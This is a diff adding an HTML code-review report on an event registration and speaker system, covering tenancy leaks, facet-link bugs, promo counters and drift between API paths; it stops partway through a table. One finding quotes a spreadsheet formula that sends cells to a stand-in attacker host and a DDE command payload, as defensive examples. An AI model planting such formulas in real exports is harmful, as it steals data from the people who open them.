@@ -1,0 +1,701 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Code Review — Registrations &amp; Speakers (July 2026)</title>
+<style>
+  :root {
+    --bg: #ffffff;
+    --fg: #1a1d21;
+    --muted: #5f6b7a;
+    --line: #e3e8ee;
+    --card: #f7f9fb;
+    --accent: #00aade;
+    --blocker: #b91c1c;
+    --high: #c2410c;
+    --medium: #a16207;
+    --low: #0f766e;
+    --code-bg: #f3f5f7;
+  }
+  * { box-sizing: border-box; }
+  body {
+    margin: 0; padding: 0 1rem 6rem;
+    font: 16px/1.65 -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+    color: var(--fg); background: var(--bg);
+  }
+  .wrap { max-width: 960px; margin: 0 auto; }
+  header { padding: 3rem 0 1.5rem; border-bottom: 3px solid var(--accent); margin-bottom: 2rem; }
+  h1 { font-size: 2rem; margin: 0 0 .4rem; letter-spacing: -.02em; }
+  .sub { color: var(--muted); font-size: .95rem; }
+  h2 {
+    font-size: 1.35rem; margin: 3rem 0 1rem; padding-bottom: .4rem;
+    border-bottom: 1px solid var(--line); letter-spacing: -.01em;
+  }
+  h3 { font-size: 1.05rem; margin: 2rem 0 .5rem; }
+  code, pre { font-family: ui-monospace, SFMono-Regular, "SF Mono", Menlo, monospace; font-size: .86em; }
+  code { background: var(--code-bg); padding: .12em .35em; border-radius: 3px; }
+  pre {
+    background: var(--code-bg); border: 1px solid var(--line); border-radius: 6px;
+    padding: .85rem 1rem; overflow-x: auto; line-height: 1.5; margin: .75rem 0;
+  }
+  pre code { background: none; padding: 0; }
+  table { width: 100%; border-collapse: collapse; margin: 1rem 0; font-size: .93rem; }
+  th, td { text-align: left; padding: .55rem .7rem; border-bottom: 1px solid var(--line); vertical-align: top; }
+  th { font-weight: 600; color: var(--muted); font-size: .82rem; text-transform: uppercase; letter-spacing: .04em; }
+  .tbl-wrap { overflow-x: auto; }
+  .sev { font-weight: 700; font-size: .74rem; letter-spacing: .05em; text-transform: uppercase;
+         padding: .16em .5em; border-radius: 3px; color: #fff; white-space: nowrap; }
+  .sev.blocker { background: var(--blocker); }
+  .sev.high { background: var(--high); }
+  .sev.medium { background: var(--medium); }
+  .sev.low { background: var(--low); }
+  .finding {
+    background: var(--card); border: 1px solid var(--line); border-left: 4px solid var(--line);
+    border-radius: 6px; padding: 1.1rem 1.3rem; margin: 1.25rem 0;
+  }
+  .finding.high { border-left-color: var(--high); }
+  .finding.medium { border-left-color: var(--medium); }
+  .finding.low { border-left-color: var(--low); }
+  .finding h3 { margin-top: 0; }
+  .loc { color: var(--muted); font-size: .87rem; margin: .1rem 0 .8rem; }
+  .lbl { font-weight: 600; font-size: .8rem; text-transform: uppercase; letter-spacing: .04em;
+         color: var(--muted); margin: .9rem 0 .2rem; }
+  .note { background: #f0f9ff; border: 1px solid #bae6fd; border-radius: 6px; padding: .9rem 1.1rem; margin: 1.25rem 0; }
+  .note.warn { background: #fffbeb; border-color: #fde68a; }
+  ul, ol { padding-left: 1.4rem; }
+  li { margin: .3rem 0; }
+  .toc a { color: var(--fg); text-decoration: none; border-bottom: 1px solid var(--line); }
+  .toc a:hover { border-bottom-color: var(--accent); }
+  footer { margin-top: 4rem; padding-top: 1.5rem; border-top: 1px solid var(--line); color: var(--muted); font-size: .88rem; }
+
+  @media (prefers-color-scheme: dark) {
+    :root {
+      --bg: #14171a; --fg: #e6e9ec; --muted: #93a1b0; --line: #2b3138;
+      --card: #1b1f24; --code-bg: #22272d;
+      --blocker: #ef4444; --high: #fb923c; --medium: #fbbf24; --low: #2dd4bf;
+    }
+    .sev { color: #14171a; }
+    .note { background: #0c2b3a; border-color: #1e4a5f; }
+    .note.warn { background: #33290c; border-color: #66551a; }
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<header>
+  <h1>Code Review — Registrations &amp; Speakers</h1>
+  <p class="sub">
+    Production-readiness audit · 10 July 2026 · EA-SYS <code>main</code> @ <code>598839b</code><br />
+    Four independent review passes: registration lifecycle · speakers &amp; companion registrations ·
+    RBAC / security · duplication &amp; failure-visibility.
+  </p>
+</header>
+
+<div class="note">
+  <strong>How to read this.</strong> Findings are grouped by <em>theme</em>, not by which agent found them,
+  because the same root causes surfaced from several angles. Each carries a severity, the exact code,
+  and a concrete failure scenario — no finding is here unless it was verified in source.
+  Everything already tracked in <code>docs/ROADMAP.md</code> was deliberately excluded so this
+  document is <em>net-new</em>.
+</div>
+
+<h2>1. Executive summary</h2>
+
+<p>
+  The core of both domains is <strong>well built</strong>. The seat model
+  (<code>planSeatTransition</code> / <code>claimSeat</code> / <code>releaseSeat</code>) is a pure,
+  unit-tested design with correct atomic guards; the refund arc (credit-note gate → optimistic lock →
+  cumulative Stripe idempotency keys → refund-before-cancel) shows real care that money is never left in
+  limbo; the services layer's errors-as-values convention makes failure paths explicit; and the
+  ONSITE per-event isolation fix is genuinely applied to all five desk routes.
+</p>
+
+<p>
+  The risk is concentrated at the <strong>seams between callers</strong>, not inside any one path.
+  Three structural patterns explain almost every finding below:
+</p>
+
+<ol>
+  <li>
+    <strong>Fixes land on one copy of a mirrored path.</strong> After an extraction (the seat applier),
+    the <em>orchestration shells</em> around it stayed duplicated REST↔MCP — and subsequent fixes
+    (the sponsor gate, the payment-gated check-in, the tag sync) were applied to the REST copy only.
+    The agent/n8n path now enforces a different business policy than the dashboard.
+  </li>
+  <li>
+    <strong>Bulk and override paths skip the invariants the single path enforces.</strong>
+    <code>bulk-type</code>, <code>create_registrations_bulk</code>, <code>create_speakers_bulk</code>,
+    CSV import, and <code>check_in_registration(allowCancelled)</code> each bypass at least one guard
+    the single-row path treats as mandatory.
+  </li>
+  <li>
+    <strong>The speaker↔registration facet link is one-directional.</strong> Speaker-side changes
+    cascade to the companion; registration-side changes do not cascade back.
+  </li>
+</ol>
+
+<div class="tbl-wrap">
+<table>
+  <thead><tr><th>Severity</th><th>Count</th><th>Meaning</th></tr></thead>
+  <tbody>
+    <tr><td><span class="sev blocker">Blocker</span></td><td>0</td><td>Nothing requires an emergency fix or rollback.</td></tr>
+    <tr><td><span class="sev high">High</span></td><td>9</td><td>Can cause a real production incident: data leak, wrong money, a speaker stuck at the door, corrupted counters.</td></tr>
+    <tr><td><span class="sev medium">Medium</span></td><td>11</td><td>Wrong behaviour on a reachable path; usually confined to bulk/agent/override flows.</td></tr>
+    <tr><td><span class="sev low">Low</span></td><td>4</td><td>Correctness drift or hygiene; no near-term incident path.</td></tr>
+  </tbody>
+</table>
+</div>
+
+<p class="toc">
+  Jump to: <a href="#security">Security &amp; tenancy</a> ·
+  <a href="#facets">Speaker ↔ registration facets</a> ·
+  <a href="#money">Money, seats &amp; promo</a> ·
+  <a href="#drift">Cross-caller drift</a> ·
+  <a href="#visibility">Failure visibility</a> ·
+  <a href="#plan">Remediation plan</a>
+</p>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<h2 id="security">2. Security &amp; tenancy</h2>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H1 — Cross-tenant IDOR on both <code>/activity</code> routes</h3>
+  <p class="loc">
+    <code>src/app/api/events/[eventId]/registrations/[registrationId]/activity/route.ts:26-42</code><br />
+    <code>src/app/api/events/[eventId]/speakers/[speakerId]/activity/route.ts:28-45</code>
+  </p>
+
+  <p>
+    Both routes hand-roll their event lookup instead of using <code>buildEventAccessWhere</code>,
+    and neither calls <code>denyReviewer</code>:
+  </p>
+<pre><code>const event = await db.event.findFirst({
+  where: {
+    id: eventId,
+    ...(session.user.organizationId ? { organizationId: session.user.organizationId } : {}),
+  },
+  select: { id: true },
+});</code></pre>
+
+  <p class="lbl">Why it breaks</p>
+  <p>
+    <code>REGISTRANT</code>, <code>SUBMITTER</code> and <code>REVIEWER</code> all have
+    <code>organizationId === null</code> by design (they're org-independent). For those roles the spread
+    collapses to <code>{}</code>, so the <code>where</code> becomes <code>{ id: eventId }</code> —
+    <strong>no organization filter at all</strong>. API routes bypass <code>proxy.ts</code> middleware,
+    so these roles reach the handler directly.
+  </p>
+
+  <p class="lbl">Failure scenario</p>
+  <p>
+    Anyone can self-create a <code>REGISTRANT</code> account through public registration. Authenticated as
+    that account, call <code>GET /api/events/{otherOrgEventId}/speakers/{speakerId}/activity</code>.
+    The event resolves (no org filter), the speaker resolves by <code>{id, eventId}</code>, and the response
+    returns another organization's <strong>speaker audit trail (who-edited-what field diffs), full email-send
+    history including recipient addresses and subjects, and certificate issuances</strong>.
+    <code>canViewFinance</code> redacts money keys only — names, emails and the audit timeline are returned.
+    IDs aren't trivially guessable, but they leak through public agenda and session APIs.
+  </p>
+
+  <p class="lbl">Fix</p>
+  <p>Route the event lookup through <code>buildEventAccessWhere(session.user, eventId)</code> and add <code>denyReviewer(session)</code> — the same shape every neighbouring route already uses.</p>
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H2 — CSV formula injection in every export</h3>
+  <p class="loc">
+    <code>src/app/(dashboard)/events/[eventId]/registrations/page.tsx:233-238</code> ·
+    <code>src/app/api/contacts/export/route.ts:5-8</code> · speakers export · invoices export
+  </p>
+
+<pre><code>row.map((cell) =&gt; `"${String(cell).replace(/"/g, '""')}"`).join(",")</code></pre>
+
+  <p class="lbl">Why it breaks</p>
+  <p>
+    Quote-doubling is correct CSV escaping but does nothing about <em>formula</em> interpretation. Excel,
+    Google Sheets and LibreOffice evaluate any cell whose first character is
+    <code>=</code>, <code>+</code>, <code>-</code>, <code>@</code>, tab or CR — the surrounding quotes are
+    CSV delimiters, not cell content. A repo-wide grep found <strong>no formula-neutralisation helper anywhere</strong>.
+  </p>
+
+  <p class="lbl">Failure scenario</p>
+  <p>
+    Exported columns include <code>firstName</code>, <code>lastName</code>, <code>organization</code>,
+    <code>jobTitle</code>, <code>bio</code>, <code>city</code>, <code>tags</code> — all attacker-controlled
+    through public registration, which imposes no character restrictions. A registrant sets their first name to
+    <code>=HYPERLINK("https://evil.tld/?"&amp;C2&amp;D2,"click")</code>. When an organizer opens
+    <code>registrations-&lt;id&gt;.csv</code>, the formula runs in their trusted desktop context and can exfiltrate
+    the adjacent email/phone cells. A <code>=cmd|'/c calc'!A1</code> DDE payload is the same class.
+  </p>
+
+  <p class="lbl">Fix</p>
+  <p>One shared <code>escapeCsvCell()</code> that prefixes a leading <code>'</code> when the first character is dangerous, used by every export path (registrations, speakers, contacts, invoices, attendance).</p>
+</div>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M1 — MCP registration writes scope by org, not by the tool's <code>eventId</code></h3>
+  <p class="loc"><code>src/lib/agent/tools/registrations.ts:419, 853-857, 954-957</code></p>
+<pre><code>where: { id: { in: registrationIds }, event: { organizationId: ctx.organizationId } }  // ← not ctx.eventId</code></pre>
+  <p>
+    The MCP tool is invoked bound to one <code>eventId</code>, but the mutation filters on org only.
+    An agent workflow scoped to Event A can cancel / reactivate / re-status registrations belonging to
+    <strong>Event B in the same org</strong>. Not a privilege escalation (MCP keys are admin-equivalent),
+    but a mis-scoped or hallucinated agent call silently mutates a sibling event. The REST PUT correctly
+    scopes <code>{ id: registrationId, eventId }</code>.
+  </p>
+</div>
+
+<div class="finding low">
+  <h3><span class="sev low">Low</span> &nbsp;L1 — Speakers list returns full faculty PII to submitters</h3>
+  <p class="loc"><code>src/app/api/events/[eventId]/speakers/route.ts:69-131</code></p>
+  <p>
+    Event access <em>is</em> correctly assignment-gated (a <code>SUBMITTER</code> only resolves events where
+    they have a linked Speaker), so there is no cross-tenant leak. But once resolved, the response carries every
+    speaker's <code>email</code>, <code>phone</code>, <code>bio</code>, <code>additionalEmail</code> and social links.
+    An abstracts-only submitter can enumerate the full faculty contact roster of their own event.
+    Consider a reduced projection for the session-auth branch.
+  </p>
+</div>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<h2 id="facets">3. Speaker ↔ registration facets</h2>
+
+<div class="note">
+  A speaker who attends gets a <strong>companion Registration</strong> on the hidden
+  <code>isFaculty</code> ticket type — that companion is what gives them a badge, entry barcode, DTCM
+  barcode, check-in and survey. The link is <code>Speaker.sourceRegistrationId</code>.
+  These findings are all about that link being <em>one-directional</em> or pointing at the wrong row.
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H3 — Companion link can bind to a CANCELLED registration, permanently</h3>
+  <p class="loc"><code>src/lib/speaker-companion.ts:100-118</code></p>
+<pre><code>const existing = await db.registration.findFirst({
+  where: { eventId: speaker.eventId, attendee: { email: speaker.email } },  // no status filter
+  select: { id: true },
+  orderBy: { createdAt: "asc" },                                            // oldest first
+});
+if (existing) { /* link it as the companion */ }</code></pre>
+
+  <p class="lbl">Failure scenario</p>
+  <p>
+    A delegate registers, cancels, and is later added as faculty. The email match finds the cancelled row —
+    and <code>orderBy: createdAt asc</code> makes picking a stale row <em>more</em> likely when the person also
+    has an active newer registration. The link is then permanent: the
+    <code>if (speaker.sourceRegistrationId) return "already-linked"</code> short-circuit means no
+    Faculty companion is ever created and the backfill script no-ops.
+  </p>
+  <p>
+    The speaker now holds a companion that <strong>check-in hard-rejects</strong>
+    (<code>"Cannot check in a cancelled registration"</code>). Nothing surfaces it until the confirmed
+    speaker is turned away at the door with a dead barcode.
+  </p>
+
+  <p class="lbl">Fix</p>
+  <p>Exclude <code>CANCELLED</code> from the email-match (prefer an active row; fall back to creating a fresh companion).</p>
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H4 — Registration email change does not cascade to the Speaker facet</h3>
+  <p class="loc"><code>src/app/api/events/[eventId]/registrations/[registrationId]/email/route.ts</code> (PATCH)</p>
+
+  <p>
+    The speaker-side PATCH <em>does</em> sync its companion. The registration-side PATCH updates only
+    Attendee → User → Contact. The asymmetry matters because faculty companion rows are visible in the
+    registrations list (operational surfaces deliberately keep faculty).
+  </p>
+
+  <p class="lbl">Failure scenario</p>
+  <p>An organizer fixes a typo'd email on a faculty row in the registrations list. Then:</p>
+  <ol>
+    <li><code>Speaker.email</code> keeps the dead address, so invitations and agreements keep going there.</li>
+    <li><code>repointOrgContactEmail</code> moves the org Contact to the new address; the next speaker PUT calls <code>syncToContact({ email: speaker.email /* old */ })</code> and <strong>re-creates a stale Contact</strong> at the old address.</li>
+    <li>Adding "the same person" as a speaker at the corrected email passes the <code>@@unique([eventId, email])</code> check → <strong>duplicate Speaker + a second Faculty companion</strong>.</li>
+  </ol>
+
+  <p class="lbl">Fix</p>
+  <p>Detect <code>createdSource === "SPEAKER_COMPANION"</code> (or the <code>sourceRegistrationId</code> back-pointer) and cascade to <code>Speaker.email</code> inside the same transaction — mirroring the speaker-side PATCH.</p>
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H5 — MCP tag writes bypass <code>person-tag-sync</code> entirely</h3>
+  <p class="loc"><code>src/lib/agent/tools/speakers.ts:246-250</code> · <code>src/lib/agent/tools/registrations.ts:584-585</code></p>
+
+  <p>
+    The July tag-sync (commit <code>a307d9b</code>, "sync tags between a person's Registration and Speaker facets")
+    is imported by exactly four REST routes. It never reached the MCP executors, which write tags raw:
+  </p>
+<pre><code>if (Array.isArray(input.tags)) {
+  updates.tags = (input.tags as unknown[])
+    .map((t) =&gt; normalizeTag(String(t).slice(0, 100)))
+    .filter(Boolean);
+}</code></pre>
+
+  <p class="lbl">Why it matters right now</p>
+  <p>
+    Tags are the routing key for certificates, badge cohorts and email segments — and the n8n/agent path is a
+    live consumer (the Webflow committee sync). Tagging committee speakers via MCP <code>update_speaker</code>
+    updates <code>Speaker.tags</code> only, so the companion <code>Attendee.tags</code> stays stale. Consequently:
+    the survey-gated <strong>ATTENDANCE certificate auto-issue silently issues nothing</strong> (it routes on
+    attendee tags), the bulk-email <code>tagsInclude</code> filter excludes them, and
+    <code>GET /registrations?tags=committee</code> misses them. The reverse hole exists in
+    <code>update_registration</code>.
+  </p>
+</div>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M2 — <code>ensureSpeakerCompanionRegistration</code> is check-then-create with no uniqueness backstop</h3>
+  <p class="loc"><code>src/lib/speaker-companion.ts:100-124, 171-174</code></p>
+  <p>
+    Two concurrent calls (double-submitted <code>/submitter</code> POST; a speaker-add racing a public
+    registration for the same email) both see no existing registration, both create an attendee + a
+    <code>CONFIRMED</code> registration with a minted <code>qrCode</code>, and the second
+    <code>speaker.update</code> overwrites the pointer. The loser is an <strong>orphaned CONFIRMED Faculty
+    registration holding a valid entry barcode</strong> — scannable at check-in, printed in bulk-badge runs,
+    and invisible to the speaker DELETE cleanup (which follows <code>sourceRegistrationId</code> only).
+    A duplicate faculty <em>ticket type</em> is harmless, as the code comments note; a duplicate
+    <em>registration</em> is a ghost physical-access credential. A partial unique index or an advisory lock
+    keyed on <code>(eventId, email)</code> closes it.
+  </p>
+</div>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M3 — Deleting a companion registration silently strips the speaker's attendee facet</h3>
+  <p class="loc"><code>prisma/schema.prisma:1056</code> (<code>onDelete: SetNull</code>) · registration DELETE handler</p>
+  <p>
+    The DELETE handler has no <code>createdSource === "SPEAKER_COMPANION"</code> check. An operator tidying the
+    registrations list ("why is there a comp registration for someone who never registered?") deletes it;
+    <code>sourceRegistrationId</code> SetNulls; the speaker stays CONFIRMED but now has no
+    badge / barcode / check-in / survey / certificate facet, and nothing re-runs the ensure. Recovery is a
+    manual run of <code>scripts/backfill-speaker-companion-registrations.ts</code>.
+    At minimum, warn on companion rows and log the detach so it's discoverable.
+  </p>
+</div>
+
+<div class="finding low">
+  <h3><span class="sev low">Low</span> &nbsp;L2 — Speaker DELETE cleans up the companion outside the transaction</h3>
+  <p class="loc"><code>src/app/api/events/[eventId]/speakers/[speakerId]/route.ts:393-421</code></p>
+  <p>
+    The speaker is deleted first; the companion delete follows in a separate, failure-isolated block. If that
+    transaction fails (the P2024 pool-timeout class this box has already hit), the speaker is gone but a
+    CONFIRMED Faculty registration with a valid barcode survives — check-in-able, with nobody behind it, and
+    only an error-log line as evidence. Failure isolation is the right contract for <em>create</em>, not for
+    <em>delete</em>. Wrap the pair in one transaction, or delete the companion first.
+  </p>
+</div>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<h2 id="money">4. Money, seats &amp; promo codes</h2>
+
+<div class="note warn">
+  <strong>Dormancy caveat.</strong> <code>soldCount</code> counters are not currently enforced (events are
+  uncapped), so pure seat-counter bugs have near-zero live impact <em>today</em>. They become real the moment
+  capacity limits or multi-tenancy land. Promo <code>usedCount</code> and price fields are <strong>live now</strong>.
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H6 — Promo <code>usedCount</code> release is one-way and unguarded; it can go negative</h3>
+  <p class="loc"><code>src/lib/registration-seat-db.ts:105-108</code></p>
+<pre><code>const becomingCancelled = input.next.status === "CANCELLED" &amp;&amp; input.prev.status !== "CANCELLED";
+if (becomingCancelled &amp;&amp; input.promoCodeId) {
+  await tx.promoCode.update({ where: { id: input.promoCodeId }, data: { usedCount: { decrement: 1 } } });
+}</code></pre>
+
+  <p>Three defects in four lines:</p>
+  <ul>
+    <li>No re-increment on reactivation. <code>CANCELLED → CONFIRMED</code> re-claims the seat but not the promo.</li>
+    <li><code>Registration.promoCodeId</code>, <code>discountAmount</code> and the <code>PromoCodeRedemption</code> row all survive the cancel.</li>
+    <li><strong>No <code>usedCount: { gt: 0 }</code> guard</strong> — unlike <code>promo-code-service.releaseExistingRedemption</code>, which the same codebase treats as the correct pattern.</li>
+  </ul>
+
+  <p class="lbl">Failure scenarios</p>
+  <ol>
+    <li>Registration with a promo (<code>usedCount = 1</code>) → cancel (→ 0) → REST PUT reactivate to CONFIRMED (stays 0; the registration keeps its discount) → cancel again (→ <strong>−1</strong>). A <code>maxUses</code>-capped code now admits extra redemptions.</li>
+    <li>Cancel a promo'd UNPAID registration (applier decrements), then hit <code>DELETE /promo</code> on it — its <code>paymentStatus</code> is still UNPAID so the OUTSTANDING gate passes — and <code>releaseExistingRedemption</code> decrements <strong>again</strong>. Two releases, one redemption.</li>
+  </ol>
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H7 — Registration PUT commits attendee edits <em>before</em> the optimistic-lock check</h3>
+  <p class="loc"><code>src/app/api/events/[eventId]/registrations/[registrationId]/route.ts:425-499</code></p>
+<pre><code>if (attendee) {
+  await db.attendee.update({ where: { id: existingRegistration.attendeeId }, ... });   // ← outside the tx
+  ...
+  await syncToContact({ ... });                                                        // ← outside the tx
+}
+...
+const registration = await db.$transaction(async (tx) =&gt; {
+  ... updateMany({ where: { id, ...(expectedUpdatedAt &amp;&amp; { updatedAt: ... }) } })     // ← the lock lives here
+});</code></pre>
+
+  <p class="lbl">Failure scenario</p>
+  <p>
+    Two admins open the same registration. B saves name / tag / dietary edits together with a status change.
+    A saved first, so B gets <code>409 STALE_WRITE</code> — <em>"reload the latest version and try again"</em> —
+    but B's attendee fields, the Contact-store sync and the speaker-tag mirror have <strong>already
+    persisted</strong>. Two editors' data silently interleaves while the UI reports nothing was saved. The same
+    partial write happens when the transaction later throws <code>CAPACITY_EXCEEDED</code>.
+  </p>
+  <p>
+    Drift note: the MCP <code>update_registration</code> executor does the attendee update <em>inside</em> the
+    transaction, after the lock check. The two paths disagree on atomicity.
+  </p>
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H8 — Bulk type change never re-stamps <code>originalPrice</code> and bypasses every repricing guard</h3>
+  <p class="loc"><code>src/app/api/events/[eventId]/registrations/bulk-type/route.ts:133-136</code></p>
+<pre><code>await tx.registration.updateMany({
+  where: { id: { in: registrations.map((r) =&gt; r.id) } },
+  data: { ticketTypeId, pricingTierId: null },     // no originalPrice, no guards
+});</code></pre>
+
+  <p class="lbl">Failure scenario</p>
+  <p>
+    <code>readRegistrationBasePrice</code> <strong>prefers the stamped <code>originalPrice</code></strong> over
+    the ticket type's price, and the single-row paths re-stamp it via <code>resolveRepricing</code> on every type
+    change. Bulk-type doesn't. So an unpaid registration on "Student" ($100, <code>originalPrice = 100</code>)
+    bulk-moved to "Physician" ($400) keeps resolving <strong>$100</strong> in the detail sheet, the quote PDF, the
+    pay-later checkout, and <code>refundRegistration</code>'s <code>paidTotal</code>. The registrant pays $100 for a
+    $400 category and every finance surface agrees with the wrong number.
+  </p>
+  <p>
+    Bulk-type also skips both single-path guards: it will move <strong>PAID</strong> registrations
+    (single path blocks with <code>TIER_CHANGE_REQUIRES_UNPAID</code>) and registrations with a promo applied
+    (single path blocks with <code>TIER_CHANGE_HAS_DISCOUNT</code>, because the stored <code>discountAmount</code>
+    was computed against the old price).
+  </p>
+</div>
+
+<div class="finding high">
+  <h3><span class="sev high">High</span> &nbsp;H9 — Check-in exists three times with divergent gates; the MCP copy skips the payment gate and the audit log</h3>
+  <p class="loc"><code>src/lib/agent/tools/registrations.ts:330-365</code> vs <code>check-in/route.ts:15-128</code> and <code>:131-260</code></p>
+
+  <p>REST (both handlers):</p>
+<pre><code>if (registration.status === "CANCELLED") return ...400;
+if (!isComplimentary &amp;&amp; (paymentStatus === "UNPAID" || paymentStatus === "PENDING"))
+  return { error: "Cannot check in — payment required" }, 400;
+...
+await db.auditLog.create({ ... action: "CHECK_IN" ... });</code></pre>
+
+  <p>MCP <code>check_in_registration</code>:</p>
+<pre><code>if (reg.status === "CANCELLED" &amp;&amp; !allowCancelled) return {...};   // the only gate
+await db.registration.update({ data: { checkedInAt: new Date(), status: "CHECKED_IN" } });
+// no payment gate · no audit log · no seat/promo transition</code></pre>
+
+  <p class="lbl">Three concrete divergences</p>
+  <ol>
+    <li>An agent-driven "check everyone in" <strong>admits UNPAID / PENDING attendees</strong> the desk would refuse — a revenue-gate bypass at a live event.</li>
+    <li>MCP check-ins leave <strong>no <code>AuditLog</code> row</strong>, so the door trail is incomplete.</li>
+    <li><code>allowCancelled: true</code> flips <code>CANCELLED → CHECKED_IN</code> via a raw update, <strong>outside <code>applyRegistrationTransition</code></strong>. The cancel released the seat and the promo <code>usedCount</code>; this reactivation re-claims neither. Seat counters are dormant, but the promo under-count is live — and a subsequent cancel releases <code>usedCount</code> a <em>second</em> time, feeding H6's negative-counter path.</li>
+  </ol>
+  <p>The two REST handlers are themselves ~120 near-identical lines, with the <code>isComplimentary</code> computation copy-pasted. Check-in wants a single home.</p>
+</div>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M4 — Refund routes the whole balance through the newest payment only</h3>
+  <p class="loc"><code>src/services/payment-service.ts:237-238, 248-249</code></p>
+<pre><code>const payment = registration.payments[0];             // newest PAID payment only
+const isManualRefund = !payment?.stripePaymentId;
+...
+const paidTotal = registration.payments.reduce((s, p) =&gt; s + Number(p.amount), 0);   // ALL payments</code></pre>
+  <p>
+    <code>paidTotal</code> (and thus the default full-refund amount) sums <em>all</em> PAID payments — the exact
+    multi-payment shape the July-7 H2 fix acknowledged as real — but the execution branch looks only at
+    <code>payments[0]</code>. Two failure directions:
+  </p>
+  <ul>
+    <li>Stripe $200 + later manual bank capture $300 (manual is newest) → <code>isManualRefund = true</code>; the $500 "refund" is merely <em>recorded</em>. The Stripe $200 is never reversed and the organizer is told to return everything out-of-band.</li>
+    <li>Reverse order → <code>stripe.refunds.create({ payment_intent, amount: 500 })</code> against a $300 intent → Stripe rejects → <code>STRIPE_FAILED</code>, rollback. The registration becomes <strong>unrefundable through the app</strong>, and <code>cancelRegistration({refund:true})</code> aborts every time.</li>
+  </ul>
+</div>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M5 — Seat/promo deltas are computed from snapshots read <em>outside</em> the transaction that applies them</h3>
+  <p class="loc"><code>src/services/payment-service.ts:421 → 484-488</code> · <code>agent/tools/registrations.ts:852 → 899</code> · <code>bulk-type/route.ts:71 → 111</code></p>
+  <p>
+    In <code>cancelRegistration</code> the gap between the snapshot read and the transaction contains the
+    <strong>Stripe refund network call</strong> — seconds. If another admin flips the registration
+    in-person → virtual during that window (releasing its seat), the cancel then commits and
+    <code>applyRegistrationTransition</code> releases from the stale <code>prev</code> <strong>again</strong>.
+    The claim-first <code>updateMany</code> defends against a concurrent <em>cancel</em>, not a concurrent
+    mode/type change. Distinct from the ROADMAP's L3 (which is about callers omitting
+    <code>expectedUpdatedAt</code>); this holds even when every caller sends it. Fix: re-read the row inside the
+    transaction and compute <code>prev</code> from that.
+  </p>
+</div>
+
+<div class="finding medium">
+  <h3><span class="sev medium">Medium</span> &nbsp;M6 — CSV import claims a seat even for rows imported as CANCELLED</h3>
+  <p class="loc"><code>src/app/api/events/[eventId]/import/registrations/route.ts:328-336, 356</code></p>
+  <p>
+    The <code>soldCount</code> increment runs before and regardless of the per-row status, but a CANCELLED row
+    fails <code>holdsSeat()</code> — so nothing will ever release that seat (both DELETE and cancel gate release
+    on <code>holdsSeat</code>). Importing 50 historical CANCELLED rows inflates the type's
+    <code>soldCount</code> by 50 permanently; the type phantom-sells-out once capacity enforcement goes live.
+  </p>
+</div>
+
+<div class="finding low">
+  <h3><span class="sev low">Low</span> &nbsp;L3 — <code>cancelRegistration</code> lost-race returns success and writes a misleading audit row</h3>
+  <p class="loc"><code>src/services/payment-service.ts:475-506</code></p>
+  <p>
+    The early return on a lost claim (<code>claim.count === 0</code>) is inside the transaction callback; the
+    function then proceeds to write a <code>REGISTRATION_CANCELLED</code> audit row attributed to this caller,
+    log "Registration cancelled", and return <code>ok: true</code> — with no log that the claim was lost. The audit
+    trail shows two actors both cancelling. A <code>claimed</code> flag plus a warn log closes it.
+  </p>
+</div>
+
+<!-- ─────────────────────────────────────────────────────────── -->
+<h2 id="drift">5. Cross-caller drift</h2>
+
+<p>
+  The seat + promo <em>transition core</em> is genuinely centralized — <code>applyRegistrationTransition</code>
+  is called by the REST PUT, MCP <code>update_registration</code> and
+  <code>payment-service.cancelRegistration</code> alike. What remains duplicated is the ~230-line
+  <strong>orchestration shell</strong> around it (sponsor invariant, billing-account lookup, ticket-type scope
+  check, <code>changeData</code> assembly, qrCode mint, audit/sync/stats fan-out), and that shell has already
+  drifted again after the extraction.
+</p>
+
+<div class="tbl-wrap">
+<table>
+  <thead>
+    <tr><th>#</th><th>Sev</th><th>Drift</th><th>Consequence</th></tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>M7</td><td><span class="sev medium">Med</span></td>
+      <td><strong>Sponsor gate fixed on REST only.</strong> The July-7 H2 change-scoped the <code>INCLUSIVE_REQUIRES_SPONSOR</code> / <code>SPONSOR_NOT_FOUND</code> checks to requests that actually touch those fields. MCP still checks unconditionally, under a comment that says "Same rules as the REST PUT route".</td>
+      <td>An agent fixing a phone number on a legacy INCLUSIVE-without-sponsor registration is rejected outright, while the same edit succeeds in the dashboard.</td>
+    </tr>
+    <tr>
+      <td>M8</td><td><span class="sev medium">Med</span></td>
+      <td><strong><code>create_registrations_bulk</code> drift (4 behaviours):</strong> no <code>paymentStatus</code> default (falls to schema <code>UNPAID</code> even for $0 tickets); dup check omits the <code>CANCELLED</code> exclusion; <code>requiresApproval</code> ignored; no sales-window check and no confirmation email.</td>
+      <td>"Bulk-import these 40 comp guests" via the agent produces 40 UNPAID rows that the Chase-Unpaid tile then emails a payment demand to. A cancelled attendee can never be re-added via bulk.</td>
+    </tr>
+    <tr>
+      <td>M9</td><td><span class="sev medium">Med</span></td>
